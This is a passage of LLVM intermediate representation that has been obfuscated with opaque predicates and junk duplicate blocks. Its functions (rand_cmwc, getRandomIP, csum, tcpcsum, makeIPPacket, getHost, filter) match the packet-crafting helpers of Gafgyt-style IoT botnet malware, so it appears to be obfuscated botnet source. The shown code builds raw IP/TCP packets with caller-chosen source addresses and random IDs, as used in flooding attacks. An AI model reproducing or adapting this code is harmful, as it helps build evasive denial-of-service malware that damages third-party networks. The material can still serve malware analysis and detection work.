  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %66

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.3
  %47 = load i32, i32* @y.4
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %45
  %54 = load i32, i32* %11, align 4
  %55 = add i32 %54, 1
  store i32 %55, i32* %11, align 4
  %56 = load i32, i32* @c, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* @c, align 4
  %58 = load i32, i32* @x.3
  %59 = load i32, i32* @y.4
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart248, label %originalBB35alteredBB

originalBBpart248:                                ; preds = %originalBB35
  br label %66

; <label>:66:                                     ; preds = %originalBBpart248, %originalBBpart2
  %67 = load i32, i32* @x.3
  %68 = load i32, i32* @y.4
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %66
  %75 = load i32, i32* %12, align 4
  %76 = load i32, i32* %11, align 4
  %77 = sub i32 %75, %76
  %78 = load i32, i32* @rand_cmwc.i, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %79
  store i32 %77, i32* %80, align 4
  %81 = load i32, i32* @x.3
  %82 = load i32, i32* @y.4
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart263, label %originalBB50alteredBB

originalBBpart263:                                ; preds = %originalBB50
  ret i32 %77

originalBBalteredBB:                              ; preds = %originalBB, %0
  %89 = alloca i64, align 8
  %90 = alloca i64, align 8
  %91 = alloca i32, align 4
  %92 = alloca i32, align 4
  store i64 18782, i64* %90, align 8
  store i32 -2, i32* %92, align 4
  %93 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 %93, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %93, 1
  %gen2 = mul i32 %_1, 1
  %_3 = sub i32 %93, 1
  %gen4 = mul i32 %_3, 1
  %94 = add i32 %93, 1
  %_5 = sub i32 0, %94
  %gen6 = add i32 %_5, 4095
  %_7 = shl i32 %94, 4095
  %_8 = sub i32 %94, 4095
  %gen9 = mul i32 %_8, 4095
  %_10 = shl i32 %94, 4095
  %_11 = shl i32 %94, 4095
  %_12 = sub i32 %94, 4095
  %gen13 = mul i32 %_12, 4095
  %95 = and i32 %94, 4095
  store i32 %95, i32* @rand_cmwc.i, align 4
  %96 = load i64, i64* %90, align 8
  %97 = load i32, i32* @rand_cmwc.i, align 4
  %98 = zext i32 %97 to i64
  %99 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %98
  %100 = load i32, i32* %99, align 4
  %101 = zext i32 %100 to i64
  %_14 = sub i64 0, %96
  %gen15 = add i64 %_14, %101
  %_16 = shl i64 %96, %101
  %_17 = sub i64 %96, %101
  %gen18 = mul i64 %_17, %101
  %_19 = sub i64 %96, %101
  %gen20 = mul i64 %_19, %101
  %_21 = shl i64 %96, %101
  %_22 = sub i64 0, %96
  %gen23 = add i64 %_22, %101
  %_24 = sub i64 0, %96
  %gen25 = add i64 %_24, %101
  %102 = mul i64 %96, %101
  %103 = load i32, i32* @c, align 4
  %104 = zext i32 %103 to i64
  %_26 = shl i64 %102, %104
  %_27 = shl i64 %102, %104
  %_28 = sub i64 %102, %104
  %gen29 = mul i64 %_28, %104
  %105 = add i64 %102, %104
  store i64 %105, i64* %89, align 8
  %106 = load i64, i64* %89, align 8
  %_30 = shl i64 %106, 32
  %107 = lshr i64 %106, 32
  %108 = trunc i64 %107 to i32
  store i32 %108, i32* @c, align 4
  %109 = load i64, i64* %89, align 8
  %110 = load i32, i32* @c, align 4
  %111 = zext i32 %110 to i64
  %_31 = shl i64 %109, %111
  %_32 = sub i64 %109, %111
  %gen33 = mul i64 %_32, %111
  %_34 = shl i64 %109, %111
  %112 = add i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %91, align 4
  %114 = load i32, i32* %91, align 4
  %115 = load i32, i32* @c, align 4
  %116 = icmp ult i32 %114, %115
  br label %originalBB

originalBB35alteredBB:                            ; preds = %originalBB35, %45
  %117 = load i32, i32* %11, align 4
  %_36 = sub i32 %117, 1
  %gen37 = mul i32 %_36, 1
  %118 = add i32 %117, 1
  store i32 %118, i32* %11, align 4
  %119 = load i32, i32* @c, align 4
  %_38 = sub i32 %119, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %119, 1
  %_41 = shl i32 %119, 1
  %_42 = sub i32 %119, 1
  %gen43 = mul i32 %_42, 1
  %_44 = sub i32 %119, 1
  %gen45 = mul i32 %_44, 1
  %_46 = shl i32 %119, 1
  %120 = add i32 %119, 1
  store i32 %120, i32* @c, align 4
  br label %originalBB35

originalBB50alteredBB:                            ; preds = %originalBB50, %66
  %121 = load i32, i32* %12, align 4
  %122 = load i32, i32* %11, align 4
  %_51 = sub i32 %121, %122
  %gen52 = mul i32 %_51, %122
  %_53 = shl i32 %121, %122
  %_54 = sub i32 %121, %122
  %gen55 = mul i32 %_54, %122
  %_56 = sub i32 0, %121
  %gen57 = add i32 %_56, %122
  %_58 = sub i32 0, %121
  %gen59 = add i32 %_58, %122
  %_60 = sub i32 %121, %122
  %gen61 = mul i32 %_60, %122
  %123 = sub i32 %121, %122
  %124 = load i32, i32* @rand_cmwc.i, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %125
  store i32 %123, i32* %126, align 4
  br label %originalBB50
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %44

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i16*, i16** %3, align 8
  %31 = bitcast i16* %30 to i8*
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = load i64, i64* %5, align 8
  %35 = add i64 %34, %33
  store i64 %35, i64* %5, align 8
  %36 = load i32, i32* @x.9
  %37 = load i32, i32* @y.10
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %44

; <label>:44:                                     ; preds = %originalBBpart2, %18
  br label %45

; <label>:45:                                     ; preds = %originalBBpart227, %44
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %71

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.9
  %51 = load i32, i32* @y.10
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %49
  %58 = load i64, i64* %5, align 8
  %59 = and i64 %58, 65535
  %60 = load i64, i64* %5, align 8
  %61 = lshr i64 %60, 16
  %62 = add i64 %59, %61
  store i64 %62, i64* %5, align 8
  %63 = load i32, i32* @x.9
  %64 = load i32, i32* @y.10
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart227, label %originalBB3alteredBB

originalBBpart227:                                ; preds = %originalBB3
  br label %45

; <label>:71:                                     ; preds = %45
  %72 = load i64, i64* %5, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %21
  %75 = load i16*, i16** %3, align 8
  %76 = bitcast i16* %75 to i8*
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i64
  %79 = load i64, i64* %5, align 8
  %_ = shl i64 %79, %78
  %_1 = sub i64 %79, %78
  %gen = mul i64 %_1, %78
  %_2 = shl i64 %79, %78
  %80 = add i64 %79, %78
  store i64 %80, i64* %5, align 8
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %49
  %81 = load i64, i64* %5, align 8
  %_4 = shl i64 %81, 65535
  %_5 = sub i64 %81, 65535
  %gen6 = mul i64 %_5, 65535
  %_7 = sub i64 0, %81
  %gen8 = add i64 %_7, 65535
  %_9 = shl i64 %81, 65535
  %82 = and i64 %81, 65535
  %83 = load i64, i64* %5, align 8
  %_10 = sub i64 0, %83
  %gen11 = add i64 %_10, 16
  %84 = lshr i64 %83, 16
  %_12 = sub i64 0, %82
  %gen13 = add i64 %_12, %84
  %_14 = sub i64 %82, %84
  %gen15 = mul i64 %_14, %84
  %_16 = sub i64 %82, %84
  %gen17 = mul i64 %_16, %84
  %_18 = shl i64 %82, %84
  %_19 = sub i64 0, %82
  %gen20 = add i64 %_19, %84
  %_21 = sub i64 0, %82
  %gen22 = add i64 %_21, %84
  %_23 = sub i64 %82, %84
  %gen24 = mul i64 %_23, %84
  %_25 = shl i64 %82, %84
  %85 = add i64 %82, %84
  store i64 %85, i64* %5, align 8
  br label %originalBB3
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias i8* @malloc(i64 %26) #6
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* %31, i64 24, i32 1, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* %36, i64 20, i32 1, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* %37, i32 %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* %41) #6
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.13
  %7 = load i32, i32* @y.14
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.13
  %57 = load i32, i32* @y.14
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 %71, -16
  %gen = mul i8 %_, -16
  %_1 = shl i8 %71, -16
  %_2 = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_3 = sub i8 0, %72
  %gen4 = add i8 %_3, 5
  %_5 = sub i8 %72, 5
  %gen6 = mul i8 %_5, 5
  %_7 = shl i8 %72, 5
  %_8 = sub i8 0, %72
  %gen9 = add i8 %_8, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_10 = sub i8 0, %76
  %gen11 = add i8 %_10, 15
  %77 = and i8 %76, 15
  %_12 = shl i8 %77, 64
  %_13 = sub i8 0, %77
  %gen14 = add i8 %_13, 64
  %_15 = shl i8 %77, 64
  %_16 = sub i8 0, %77
  %gen17 = add i8 %_16, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_18 = sub i64 20, %82
  %gen19 = mul i64 %_18, %82
  %_20 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.in_addr*, align 8
  %14 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %12, align 8
  store %struct.in_addr* %1, %struct.in_addr** %13, align 8
  %15 = load i8*, i8** %12, align 8
  %16 = call i32 @inet_addr(i8* %15) #6
  %17 = load %struct.in_addr*, %struct.in_addr** %13, align 8
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = icmp eq i32 %16, -1
  %20 = load i32, i32* @x.15
  %21 = load i32, i32* @y.16
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %28, label %45

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* @x.15
  %30 = load i32, i32* @y.16
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  store i32 1, i32* %11, align 4
  %37 = load i32, i32* @x.15
  %38 = load i32, i32* @y.16
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %46

; <label>:46:                                     ; preds = %45, %originalBBpart24
  %47 = load i32, i32* %11, align 4
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %2
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca %struct.in_addr*, align 8
  %51 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %49, align 8
  store %struct.in_addr* %1, %struct.in_addr** %50, align 8
  %52 = load i8*, i8** %49, align 8
  %53 = call i32 @inet_addr(i8* %52) #6
  %54 = load %struct.in_addr*, %struct.in_addr** %50, align 8
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = icmp eq i32 %53, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %28
  store i32 1, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %39, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = sub i64 %6, 1
  %8 = getelementptr inbounds i8, i8* %4, i64 %7
  %9 = load i8, i8* %8, align 1
  %10 = sext i8 %9 to i32
  %11 = icmp eq i32 %10, 13
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %3
  %13 = load i32, i32* @x.17
  %14 = load i32, i32* @y.18
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

